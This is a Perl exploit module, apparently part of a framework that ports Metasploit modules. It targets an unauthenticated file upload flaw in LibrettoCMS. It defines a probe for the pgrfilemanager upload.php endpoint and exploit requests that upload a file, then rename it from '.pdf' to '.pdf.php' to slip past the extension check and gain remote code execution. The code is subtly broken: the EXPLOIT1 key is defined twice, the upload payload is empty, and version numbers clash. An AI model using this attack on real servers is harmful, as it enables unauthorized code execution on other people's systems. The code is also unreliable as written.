package LIBRETTO::MSF::LibrettoUploadExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "LibrettoUploadExec";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/adm/ui/js/ckeditor/plugins/pgrfilemanager/php/upload.php',
  PAYLOAD => '',
  TEXT => 'Checking If : /adm/ui/js/ckeditor/plugins/pgrfilemanager/php/upload.php Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a file upload vulnerability found in LibrettoCMS 1.1.7, and

        possibly prior.  Attackers can bypass the file extension check and abuse the upload

        feature in order to upload a malicious PHP file without authentication, which

        results in arbitrary remote code execution.

      ",
  FUN => "renameFile",
  METHOD => "GET",
  MSF_MODULE => "libretto_upload_exec",
  OSVDB => 94391,
  PATH => "type=allfiles&type=allfiles&",
  PATHS => ["librettoCMS_v.2.2.2/"],
  PAYLOAD => "fun=renameFile&dir=&filename=__FILENAME__&newFilename=__NEWFILENAME__&",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The base path to LibrettoCMS",
  VALUE => "/librettoCMS_v.2.2.2/",
},
    'FILENAME' =>       { DESCRIPTION => "", VALUE => "" },
    'NEWFILENAME' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'adm/ui/js/ckeditor/plugins/pgrfilemanager/php/upload.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [POST] /adm/ui/js/ckeditor/plugins/pgrfilemanager/php/upload.php',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=_Part_646_4188026900_3313661671',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'adm/ui/js/ckeditor/plugins/pgrfilemanager/php/files.php',
      PAYLOAD      => 'fun=renameFile&dir=&filename=nYMdbt.pdf&newFilename=EQcBY.pdf.php',
      TEXT   => 'Sending Exploit #1 Request : [POST] /adm/ui/js/ckeditor/plugins/pgrfilemanager/php/files.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
